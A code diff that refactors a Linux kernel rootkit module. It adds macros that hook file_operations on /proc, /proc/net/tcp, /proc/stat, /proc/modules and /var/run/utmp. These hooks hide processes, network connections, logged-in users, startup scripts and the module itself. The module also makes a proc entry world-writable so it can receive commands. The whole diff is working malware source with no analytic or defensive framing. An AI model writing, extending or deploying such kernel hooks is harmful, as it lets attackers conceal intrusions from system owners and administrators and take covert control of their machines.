@@ -60,6 +60,50 @@
 #define UT_NAMESIZE     32
 #define UT_HOSTSIZE     256
 
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
+
+#define set_inode(inode, proc_path)\
+struct nameidata inode_data;\
+if(path_lookup(proc_path, 0, &inode_data))\
+    return;\
+inode = inode_data.path.dentry->d_inode
+
+#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
+
+#define set_inode(inode, proc_path)\
+struct nameidata inode_data;\
+if(path_lookup(proc_path, 0, &inode_data))\
+     return;\
+inode = inode_data.inode
+
+#else
+
+#define set_inode(inode, proc_path)\
+struct path p;\
+if (kern_path(proc_path, 0, &p)) {\
+    return;\
+}\
+inode = p.dentry->d_inode;
+
+#endif
+
+#define set_fops_read(inode, fops, proc_origin, func)\
+if(!inode)\
+    return;\
+fops = *inode->i_fop;\
+proc_origin = inode->i_fop;\
+fops.read = func;\
+inode->i_fop = &fops
+
+#define set_fops_readdir(inode, fops, proc_origin, func)\
+if(!inode)\
+    return;\
+fops = *inode->i_fop;\
+proc_origin = inode->i_fop;\
+fops.readdir = func;\
+inode->i_fop = &fops
+
 struct exit_status {
   short int e_termination;    /* process termination status */
   short int e_exit;           /* process exit status */
@@ -562,26 +606,11 @@ struct proc_dir_entry *find_dir_entry(struct proc_dir_entry *root, const char *n
 }
 
 void hook_proc(struct proc_dir_entry *root) {
-    // search for /proc's inode
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
-    struct nameidata inode_data;
-    if(path_lookup("/proc/", 0, &inode_data))
-        return;
-#else
-    struct path p;
-    if(kern_path("/proc/", 0, &p))
-        return;
-    pinode = p.dentry->d_inode;
-#endif
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
-    pinode = inode_data.path.dentry->d_inode;
-#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
-    pinode = inode_data.inode;
-#endif
+    set_inode(pinode, "/proc/");
 
     if(!pinode)
         return;
+
     // hook /proc readdir
     proc_fops = *pinode->i_fop;
     proc_original = pinode->i_fop;
@@ -596,7 +625,7 @@ void install_handler(struct proc_dir_entry *root) {
     if(ptr) {
         handler = ptr;
         ptr->mode |= S_IWUGO;
-        handler_original = (struct file_operations*)ptr->proc_fops;
+        handler_original = ptr->proc_fops;
         // create new handler
         handler_fops = *ptr->proc_fops;
         handler_fops.write = orders_handler;
@@ -607,145 +636,35 @@ void install_handler(struct proc_dir_entry *root) {
 void init_module_hide_hook(struct proc_dir_entry *root) {
     modules = find_dir_entry(root, "modules");
     // save original file_operations
-    modules_proc_original = (struct file_operations*)modules->proc_fops;
+    modules_proc_original = modules->proc_fops;
     modules_fops = *modules->proc_fops;
     modules_fops.read = do_read_modules;
 }
 
-void init_tcp_hide_hook(struct proc_dir_entry *root) {
-    // search for /proc/net/tcp's inode
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
-    struct nameidata inode_data;
-    if(path_lookup("/proc/net/tcp", 0, &inode_data))
-        return;
-#else
-    struct path p;
-    if(kern_path("/proc/net/tcp", 0, &p))
-        return;
-    tinode = p.dentry->d_inode;
-#endif
 
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
-    tinode = inode_data.path.dentry->d_inode;
-#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
-    tinode = inode_data.inode;
-#endif
-    if(!tinode)
-        return;
-    tcp_fops = *tinode->i_fop;
-    tcp_proc_original = tinode->i_fop;
-    tcp_fops.read = do_read_tcp;
-    tinode->i_fop = &tcp_fops;
+void init_tcp_hide_hook(struct proc_dir_entry *root) {
+    set_inode(tinode, "/proc/net/tcp");
+    set_fops_read(tinode, tcp_fops, tcp_proc_original, do_read_tcp);
 }
 
 void init_nice_hide_hook(struct proc_dir_entry *root) {
-    // search for utmp's inode
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
-    struct nameidata inode_data;
-    if(path_lookup("/proc/stat", 0, &inode_data))
-        return;
-#else
-    struct path p;
-    if(kern_path("/proc/stat", 0, &p))
-        return;
-    sinode = p.dentry->d_inode;
-#endif
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
-    sinode = inode_data.path.dentry->d_inode;
-#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
-    sinode = inode_data.inode;
-#endif
-
-    if(!sinode)
-        return;
-    stat_fops = *sinode->i_fop;
-    stat_proc_original = sinode->i_fop;
-    stat_fops.read = do_read_stat;
-    sinode->i_fop = &stat_fops;
+    set_inode(sinode, "/proc/stat");
+    set_fops_read(sinode, stat_fops, stat_proc_original, do_read_stat);
 }
 
 void init_users_hide_hook(struct proc_dir_entry *root) {
-    // search for utmp's inode
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
-    struct nameidata inode_data;
-    if(path_lookup("/var/run/utmp", 0, &inode_data))
-        return;
-#else
-    struct path p;
-    if(kern_path("/var/run/utmp", 0, &p))
-        return;
-    uinode = p.dentry->d_inode;
-#endif
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
-    uinode = inode_data.path.dentry->d_inode;
-#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
-    uinode = inode_data.inode;
-#endif
-
-    if(!uinode)
-        return;
-    user_fops = *uinode->i_fop;
-    user_proc_original = uinode->i_fop;
-    user_fops.read = do_read_users;
-    uinode->i_fop = &user_fops;
+    set_inode(uinode, "/var/run/utmp");
+    set_fops_read(uinode, user_fops, user_proc_original, do_read_users);
 }
 
 void init_hide_rc(void) {
-    // search for rc's inode
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
-    struct nameidata inode_data;
-    if(path_lookup(rc_dir, 0, &inode_data))
-        return;
-#else
-    struct path p;
-    if(kern_path(rc_dir, 0, &p))
-        return;
-    rcinode = p.dentry->d_inode;
-#endif
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
-    rcinode = inode_data.path.dentry->d_inode;
-#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
-    rcinode = inode_data.inode;
-#endif
-
-    if(!rcinode)
-        return;
-    // hook rc's readdir
-    rc_fops = *rcinode->i_fop;
-    rc_proc_original = rcinode->i_fop;
-    rc_fops.readdir = do_readdir_rc;
-    rcinode->i_fop = &rc_fops;
+    set_inode(rcinode, rc_dir);
+    set_fops_readdir(rcinode, rc_fops, rc_proc_original, do_readdir_rc);
 }
 
 void init_hide_mod(void) {
-    // search for rc's inode
-#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
-    struct nameidata inode_data;
-    if(path_lookup(mod_dir, 0, &inode_data))
-        return;
-#else
-    struct path p;
-    if(kern_path(mod_dir, 0, &p))
-        return;
-    modinode = p.dentry->d_inode;
-#endif
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 33)
-    modinode = inode_data.path.dentry->d_inode;
-#elif LINUX_VERSION_CODE < KERNEL_VERSION(3, 0, 0)
-    modinode = inode_data.inode;
-#endif
-
-    if(!modinode)
-        return;
-    // hook rc's readdir
-    mod_fops = *modinode->i_fop;
-    mod_proc_original = modinode->i_fop;
-    mod_fops.readdir = do_readdir_mod;
-    modinode->i_fop = &mod_fops;
+    set_inode(modinode, mod_dir);
+    set_fops_readdir(modinode, mod_fops, mod_proc_original, do_readdir_mod);
 }
 
 static int __init module_init_proc(void) {
@@ -758,23 +677,22 @@ static int __init module_init_proc(void) {
         init_hide_mod();
     new_proc = proc_create("dummy", 0644, 0, &fileops_struct);
     root = new_proc->parent;
-    
+
     init_tcp_hide_hook(root);
     init_module_hide_hook(root);
     init_users_hide_hook(root);
     init_nice_hide_hook(root);
-    
+
     hook_proc(root);
-    
+
     // install the handler to wait for orders...
     install_handler(root);
-    
+
     // i't no longer required.
     remove_proc_entry("dummy", 0);
     return 0;
 }
 
- 
 static void module_exit_proc(void) {
     if(proc_original)
         pinode->i_fop = proc_original;
@@ -794,7 +712,7 @@ static void module_exit_proc(void) {
         handler->mode &= (~S_IWUGO);
     }
 }
-                 
+
 module_init(module_init_proc);
 module_exit(module_exit_proc);
  
